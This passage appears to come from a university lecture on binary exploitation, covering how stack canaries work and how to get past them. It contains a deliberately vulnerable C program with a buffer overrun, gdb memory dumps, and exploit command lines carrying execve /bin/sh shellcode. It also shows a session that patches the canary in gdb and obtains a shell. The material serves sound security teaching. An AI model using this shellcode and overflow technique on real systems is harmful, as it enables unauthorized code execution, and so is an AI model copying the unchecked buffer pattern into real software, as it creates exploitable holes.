0xbffff69c <ebp+0x4>: 08048690
0xbffff698 <ebp>: bffff6c8
0xbffff694 <ebp-0x4>: 00000000
0xbffff690 <ebp-0x8>: 00000000
0xbffff68c <ebp-0xc>: 8826c000
0xbffff688 <ebp-0x10>: 41414141
0xbffff684 <ebp-0x14>: 41414141
0xbffff680 <ebp-0x18>: 4141f6c8
0xbffff67c <ebp-0x1c>: 08048790
0xbffff678 <ebp-0x20>: 00000000
0xbffff674 <ebp-0x24>: 00000001
0xbffff670 <ebp-0x28>: 0804878c
0xbffff66c <ebp-0x2c>: 08048655
0xbffff668 <ebp-0x30>: bffff698
AAAAAAAAAA
--- STACK foo ---
0xbffff6a0 <ebp+0x8>: 08048790
0xbffff69c <ebp+0x4>: 08048690
0xbffff698 <ebp>: bffff6c8
0xbffff694 <ebp-0x4>: 00000000
0xbffff690 <ebp-0x8>: 00000000
0xbffff68c <ebp-0xc>: 8826c000
0xbffff688 <ebp-0x10>: 41414141
0xbffff684 <ebp-0x14>: 41414141
0xbffff680 <ebp-0x18>: 4141f6c8
0xbffff67c <ebp-0x1c>: 08048790
0xbffff678 <ebp-0x20>: 00000000
0xbffff674 <ebp-0x24>: 00000001
0xbffff670 <ebp-0x28>: 0804878c
0xbffff66c <ebp-0x2c>: 08048655
0xbffff668 <ebp-0x30>: bffff698
```

IF you look closely, you'll see that the canary `0x00c02688` is the same
in all instances. This might be something we can leverage when defeating
the canary.

# Defeating Stack Canaries

It is actually really hard to defeat a stack canary. It requires a bit
of luck (guessing the canary) and some really poorly written code. Just
generally bad code won't do it, the code has to be pretty bad.

Before we get into all of that, there is *another* way to defeat a
canary, which is jumping the canary entirely. We don't quite yet know
how to do that, but we will get there soon.

## Some Really Bad Code

To not kill the canary, we need vulnerable program that will overrun a
buffer and also(!) write null bytes along the way. This is so we can
handle the issue of the canary having nulls. Here's some sample code
that will do that:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void foo( char ** args){
  char numbers[40];

  int i;
  for(i=0; *args; args++,i+=4){
    sscanf(*args,"%x", (int*) &numbers[i]);
  }

  int j;
  for(j=0;j<i;j+=4){
    printf("0x%x: %c%c%c%c\n", 
       j, 
       numbers[j],
       numbers[j+1],
       numbers[j+2],
       numbers[j+3]);

  }

}

int main(int argc,char *argv[]){
  foo(argv+1);
}
```

The program reads in command line fields as hex numbers and prints them
out as strings. It is actually not a useless program, but there is a
vulnerability. We can overrun the numbers array. Let's see that happen:

``` example
user@si485H-base:demo$ ./hex_to_char 0x41424344 0x45464748 0x494a4b4c 0x4d4e4f50
0x0: DCBA
0x4: HGFE
0x8: LKJI
0xc: PONM
```

If we go a bit extreme stack smash detected!:

``` example
user@si485H-base:demo$ ./hex_to_char `python -c "print ' '.join(map(hex,range(0x41414141,0x41414150)))"`
0x0: AAAA
0x4: BAAA
0x8: CAAA
0xc: DAAA
0x10: EAAA
0x14: FAAA
0x18: GAAA
0x1c: HAAA
0x20: IAAA
0x24: JAAA
0x28: KAAA
0x2c: LAAA
0x30: MAAA
0x34: NAAA
0x38: OAAA
 *** stack smashing detected ***: ./hex_to_char terminated
Aborted (core dumped)
```

If we look at the first part of the disassembly of the vulnerable foo
function in gdb:

``` example
  0x080484bd <+0>:  push   ebp
   0x080484be <+1>: mov    ebp,esp
   0x080484c0 <+3>: push   esi
   0x080484c1 <+4>: push   ebx
   0x080484c2 <+5>: sub    esp,0x60
   0x080484c5 <+8>: mov    eax,DWORD PTR [ebp+0x8]
   0x080484c8 <+11>:    mov    DWORD PTR [ebp-0x4c],eax
   0x080484cb <+14>:    mov    eax,gs:0x14
   0x080484d1 <+20>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484d4 <+23>:    xor    eax,eax
   0x080484d6 <+25>:    mov    DWORD PTR [ebp-0x3c],0x0
   0x080484dd <+32>:    jmp    0x8048508 <foo+75>
   0x080484df <+34>:    lea    edx,[ebp-0x34]
   0x080484e2 <+37>:    mov    eax,DWORD PTR [ebp-0x3c]
   0x080484e5 <+40>:    add    edx,eax
   0x080484e7 <+42>:    mov    eax,DWORD PTR [ebp-0x4c]
   0x080484ea <+45>:    mov    eax,DWORD PTR [eax]
   0x080484ec <+47>:    mov    DWORD PTR [esp+0x8],edx
   0x080484f0 <+51>:    mov    DWORD PTR [esp+0x4],0x8048650
   0x080484f8 <+59>:    mov    DWORD PTR [esp],eax
   0x080484fb <+62>:    call   0x80483b0 <__isoc99_sscanf@plt>
```

We learn the following things:

-   The canary is at ebp-0xc
-   The buffer is at ebp-0x34
-   The int i is at ebp-0x3c

That means we have 0x3c or 40 bytes or 8 integers to get to the canary,
then it is 0xf or 16 bytes or 4 integers to overwrite the return
address. Our exploit needs to look something like this:

``` example
user@si485H-base:demo$ ./hex_to_char `python -c "print '0x646170 '*10 + '0x6e616300 ' + '0x646170 '*4 +'0x72646461 ' + '0x706f6e '*10 + '0x6c656873 '*5"`
0x0: pad
0x4: pad
0x8: pad
0xc: pad
0x10: pad
0x14: pad
0x18: pad
0x1c: pad
0x20: pad
0x24: pad
0x28: can
0x2c: pad
0x30: pad
0x34: pad
0x38: pad
0x3c: addr
0x40: nop
0x44: nop
0x48: nop
0x4c: nop
0x50: nop
0x54: nop
0x58: nop
0x5c: nop
0x60: nop
0x64: nop
0x68: shel
0x6c: shel
0x70: shel
0x74: shel
0x78: shel
 *** stack smashing detected ***: ./hex_to_char terminated
Aborted (core dumped)
```

The exploit is we first do some padding, then the canary, then more
padding, the return address, nops, the shell code. Easy, right? Let's
see how we can do this in gdb.

## Defeating a Canary in GDB

The first thing we need is to set up our shell code:

``` example
user@si485H-base:demo$ echo $(printf `./hexify.sh smallest_shell` | ./le-fourbytes.py - | tr "\n" " ")
0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080
```

Then we need to run under gdb with the right padding and everything, we
can start gdb, execute with those arguments, and break in foo to learn
the canary value:

``` example

```

Ok, so now that we now our canary value and where to jump, let's restart
the program with those values:

``` example
(gdb) br foo
Breakpoint 1 at 0x80484cb: file hex_to_char.c, line 5.
(gdb) r `python -c "print '0x41414141 '*10 + '0xcafebabe ' + '0x41414141 '*3 +'0xdeadbeef ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`

Starting program: /home/user/git/si485-binary-exploits/lec/18/demo/hex_to_char `python -c "print '0x41414141 '*10 + '0xcafebabe ' + '0x41414141 '*3 +'0xdeadbeef ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`
Breakpoint 1, foo (args=0xbffff548) at hex_to_char.c:5
5   void foo( char ** args){
(gdb)ds
Dump of assembler code for function foo:
   0x080484bd <+0>: push   ebp
   0x080484be <+1>: mov    ebp,esp
   0x080484c0 <+3>: push   esi
   0x080484c1 <+4>: push   ebx
   0x080484c2 <+5>: sub    esp,0x60
   0x080484c5 <+8>: mov    eax,DWORD PTR [ebp+0x8]
   0x080484c8 <+11>:    mov    DWORD PTR [ebp-0x4c],eax
=> 0x080484cb <+14>:    mov    eax,gs:0x14
   0x080484d1 <+20>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484d4 <+23>:    xor    eax,eax
  (...)
(gdb) ni
(gdb) p/x $eax
$1 = 0x90ba2000
(gdb) x/4xw $ebp
0xbffff498: 0xbffff4b8  0x080485b0  0xbffff558  0xb7fff000
```

We now know a canary (0x90ba2000) value and we know a location to jump
to (0xbfff4a\*), so we can restart our program with those values. But
when we do that, the cannary value has changed:

``` example
(gdb) r `python -c "print '0x41414141 '*10 + '0x90ba2000 ' + '0x41414141 '*3 +'0xbffff4a4 ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/git/si485-binary-exploits/lec/18/demo/hex_to_char `python -c "print '0x41414141 '*10 + '0x90ba2000 ' + '0x41414141 '*3 +'0xbffff4a4 ' + '0x90909090 '*10 + '0xe1f7c931 0x2f6e6850 0x2f686873 0x8969622f 0xcd0bb0e3 0x90909080'"`

Breakpoint 1, foo (args=0xbffff558) at hex_to_char.c:5
5   void foo( char ** args){
(gdb) ni
0x080484d1  5   void foo( char ** args){
(gdb) p/x $eax
$2 = 0xaae87500
```

And in here lies the problem: Every time we restart the program we loose
the canary, but we can pretend like we knew it before hand by modifying
our input in gdb:

``` example
(gdb) x/s *(args+10)
0xbffff79e: "0x90ba2000"
(gdb) set *(args+10)="0xaae87500"
(gdb) x/s *(args+10)
0x804b008:  "0xaae87500"
```

And if were to now remove the breakpoints and continue:

``` example
(gdb) d
Delete all breakpoints? (y or n) y
(gdb) c
Continuing.
0x0: AAAA
0x4: AAAA
0x8: AAAA
0xc: AAAA
0x10: AAAA
0x14: AAAA
0x18: AAAA
0x1c: AAAA
0x20: AAAA
0x24: AAAA
0x28: u?
0x2c: AAAA
0x30: AAAA
0x34: AAAA
0x38: ????
0x3c: ????
0x40: ????
0x44: ????
0x48: ????
0x4c: ????
0x50: ????
0x54: ????
0x58: ????
0x5c: ????
0x60: ????
0x64: 1???
0x68: Phn/
0x6c: shh/
0x70: /bi?
0x74: ?
       ?
0x78: ????
process 29959 is executing new program: /bin/dash
$ 
```

We get a shell. But, this is not super satisfying because there is no
good way to do this outside of GDB. We need a program that does a bit
more, in particular, a program we can crash a bunch to brute force the
canary

## Brute Forcing the Canary

Why don't we just try and brute force cannary, how hard could it be?
Well, let's compare this to ASLR. With ASLR, there was 19 bits of
randomness we had to contend with, but we could handle that because of
NOP sleds. With a NOP sled, we can reduce the randomness down to 7 or 8
bits, which we can brute force fairly throughly.

We don't have the luxury of a nop-sled with Canaries, and worse, there
is 24 bits of randomness to contend with, not 19. Doing the math like
before, to get to 50% probability of getting it right at least once,
we'd need to do 16,777,215 guesses! That's way too many to do in a
reasonable amount of time. It would seem like we are S.O.L.

How do we defeat the canary? We have to jump the stack guard. For that,
we'll need to use a new technique that doesn't involve stack smashing:
format string attacks. We'll get it next. Ok, let's continue

